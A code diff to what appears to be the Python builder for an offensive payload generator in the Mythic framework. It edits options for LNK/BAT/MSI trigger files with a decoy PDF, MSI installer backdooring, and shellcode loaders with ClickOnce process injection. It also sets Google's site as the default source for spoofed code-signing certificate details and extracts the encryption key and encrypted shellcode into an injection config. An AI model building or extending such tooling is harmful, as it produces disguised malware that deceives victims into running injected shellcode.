@@ -259,6 +259,15 @@ If one is not uploaded then an example file will be used.""",
         ),
 
         BuildParameter(
+            name="0.11 Trigger Type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Type of Trigger to toggle decoy and execution",
+            choices=["LNK", "BAT", "MSI"],
+            default_value="LNK",
+            required=False,
+        ),
+
+        BuildParameter(
             name = "1.0 DLL Hijacking",
             parameter_type = BuildParameterType.File,
             description = f"""Prepares a given DLL for proxy-based hijacking.
@@ -557,7 +566,7 @@ generated if none have been entered.""",
         BuildParameter(
             name="6.4 Codesign Spoof URL",
             parameter_type=BuildParameterType.String,
-            default_value="www.test.test",
+            default_value="www.google.com",
             description="URL to clone certificate details from",
             hide_conditions=[
                 HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
@@ -584,14 +593,7 @@ generated if none have been entered.""",
                 HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
             ]
         ),
-        BuildParameter(
-            name="7.0 Trigger Type",
-            parameter_type=BuildParameterType.ChooseOne,
-            description="Type of Trigger to toggle decoy and execution",
-            choices=["LNK", "BAT", "MSI"],
-            default_value="LNK",
-            required=False,
-        ),
+
     ]
 
     build_steps = [
@@ -647,15 +649,6 @@ generated if none have been entered.""",
             return  # No MSI to backdoor
 
         try:
-            # Update build step
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="Backdooring MSI",
-                StepStdout="Downloading uploaded MSI installer...",
-                StepSuccess=True,
-            ))
-
             # Download the uploaded MSI file
             file_resp = await SendMythicRPCFileGetContent(
                 MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
@@ -665,6 +658,13 @@ generated if none have been entered.""",
             temp_dir = Path(tempfile.gettempdir())
             source_msi_path = temp_dir / f"source_{msi_backdoor_uuid}.msi"
             source_msi_path.write_bytes(file_resp.Content)
+            await SendMythicRPCPayloadUpdatebuildStep(
+                MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName="Backdooring MSI",
+                StepStdout="Downloading uploaded MSI installer...",
+                StepSuccess=True,
+            ))
 
             # Get attack parameters
             attack_type = self.get_parameter("5.4 MSI Attack Type")
@@ -774,8 +774,8 @@ generated if none have been entered.""",
     async def containerise_payload(self,agent_build_path):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
 
-        trigger_type = self.get_parameter("7.0 Trigger Type")
-        target_ext = f".{self.get_parameter('7.0 Trigger Type').lower()}"
+        trigger_type = self.get_parameter("0.11 Trigger Type")
+        target_ext = f".{self.get_parameter('0.11 Trigger Type').lower()}"
 
         match(self.get_parameter("3.0 Container Type")):
             case "7z":
@@ -1176,7 +1176,8 @@ generated if none have been entered.""",
                 print(f'User Selected: {self.get_parameter("0.0 Main Payload Type")}')
                 # Logic : Select between shellcode loader and clickonce loader
                 if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
-                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin", src=obfuscated_shellcode_path)
+                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
+                                src=obfuscated_shellcode_path)
 
                     payload_path = PurePath(agent_build_path) / "payload" / "erebus.exe"
                     payload_path = str(payload_path)
@@ -1319,23 +1320,38 @@ generated if none have been entered.""",
 
                     try:
                         encryption_key_bytes = ""
-                        if os.path.exists(encryption_key_path_cpp):
+                        encrypted_shellcode_bytes = ""
+                        if os.path.exists(encryption_shellcode_path_cpp):
                             try:
-                                with open(encryption_key_path_cpp, "r") as key_file:
-                                    key_content = key_file.read()
-                                    # Parse the key array to get hex values (e.g., 0x01, 0x02, ...)
+                                with open(encryption_shellcode_path_cpp, "r") as combined_file:
+                                    combined_content = combined_file.read()
                                     import re
-                                    hex_matches = re.findall(r'0x[0-9a-fA-F]{2}', key_content)
-                                    if hex_matches:
-                                        encryption_key_bytes = ", ".join(hex_matches)
-                            except Exception as key_error:
-                                output += f"Warning: Could not extract encryption key: {str(key_error)}\n"
+                                    
+                                    # Extract key array bytes (values between "key[" and first "}")
+                                    key_match = re.search(r'key\[.*?\]\s*=\s*\{([^}]*)\}', combined_content)
+                                    if key_match:
+                                        key_section = key_match.group(1)
+                                        hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
+                                        if hex_key:
+                                            encryption_key_bytes = ", ".join(hex_key)
+                                    
+                                    # Extract shellcode array bytes (values between "sh3llc0d3[" or "shellcode[" and "}")
+                                    shellcode_match = re.search(r'(?:sh3llc0d3|shellcode)\[.*?\]\s*=\s*\{([^}]*)\}', combined_content)
+                                    if shellcode_match:
+                                        shellcode_section = shellcode_match.group(1)
+                                        hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
+                                        if hex_shellcode:
+                                            encrypted_shellcode_bytes = ", ".join(hex_shellcode)
+                                    
+                            except Exception as extract_error:
+                                output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
 
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         injection_config_data = {
                             "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                             "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                             "ENCRYPTION_KEY": encryption_key_bytes,
+                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes
                         }
                         rendered_injection_config = injection_config_template.render(**injection_config_data)
 
@@ -1611,7 +1627,7 @@ generated if none have been entered.""",
                 decoy_dir = Path(agent_build_path) / "decoys"
                 decoy_file = decoy_dir / "decoy.pdf"
 
-                trigger_type = self.get_parameter("7.0 Trigger Type")
+                trigger_type = self.get_parameter("0.11 Trigger Type")
 
                 try:
                     trigger_path = ""
